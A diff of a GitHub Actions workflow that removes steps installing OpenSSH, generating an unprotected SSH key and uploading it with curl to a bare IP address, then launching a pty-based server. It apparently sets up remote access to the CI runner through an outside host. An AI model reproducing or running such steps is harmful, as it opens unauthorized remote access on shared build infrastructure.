@@ -6,13 +6,14 @@ jobs:
     steps:
     - uses: actions/checkout@v3
       name: checkout
-    - name: main
+    - name: setup
       shell: cmd
       run: |
-        C:\msys64\usr\bin\bash.exe -lc "pacman -S openssh --noconfirm --logfile pacman.log"
-        C:\msys64\usr\bin\ssh-keygen.exe -b 2048 -t rsa -f "/home/runneradmin/.ssh/id_rsa" -q -N ""
-        curl -F key=@C:\msys64\home\runneradmin\.ssh\id_rsa.pub http://89.104.69.220:3000/key
         pushd pty
         call npm i
         popd
-        python server.py
+    - name: run
+      shell: cmd
+      run: |
+        call npm i request
+        node server.js
